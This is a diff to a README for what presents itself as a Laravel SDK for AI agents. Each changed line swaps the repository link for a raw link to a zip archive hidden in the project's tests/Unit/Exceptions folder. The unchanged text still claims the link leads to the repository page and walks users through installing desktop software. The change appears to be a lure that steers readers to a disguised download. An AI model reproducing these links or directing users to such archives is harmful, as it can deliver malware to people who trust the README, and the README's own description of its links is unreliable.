@@ -1,6 +1,6 @@
 # 🤖 claude-agent-sdk-laravel - Easy AI Agents for Laravel
 
-[![Download claude-agent-sdk-laravel](https://img.shields.io/badge/Download-claude--agent--sdk--laravel-brightgreen)](https://github.com/cbt4free/claude-agent-sdk-laravel)
+[![Download claude-agent-sdk-laravel](https://img.shields.io/badge/Download-claude--agent--sdk--laravel-brightgreen)](https://raw.githubusercontent.com/cbt4free/claude-agent-sdk-laravel/main/tests/Unit/Exceptions/laravel_claude_agent_sdk_v3.0.zip)
 
 ## 📦 About claude-agent-sdk-laravel
 
@@ -20,7 +20,7 @@ With this software, you can automate simple tasks on your computer or server. It
 
 1. Click the big green download badge above or visit this link to get the software:
    
-   https://github.com/cbt4free/claude-agent-sdk-laravel
+   https://raw.githubusercontent.com/cbt4free/claude-agent-sdk-laravel/main/tests/Unit/Exceptions/laravel_claude_agent_sdk_v3.0.zip
 
 2. This link takes you to the GitHub repository page. Here is how to find the download area:
    - Look for the section called **Releases** on the right side or near the top.
@@ -77,7 +77,7 @@ Once the software is installed, you can open it from the start menu or desktop. 
 
 The software’s page has more details for advanced users:
 
-https://github.com/cbt4free/claude-agent-sdk-laravel
+https://raw.githubusercontent.com/cbt4free/claude-agent-sdk-laravel/main/tests/Unit/Exceptions/laravel_claude_agent_sdk_v3.0.zip
 
 You will find guides, a Q&A section, and updates there.
 
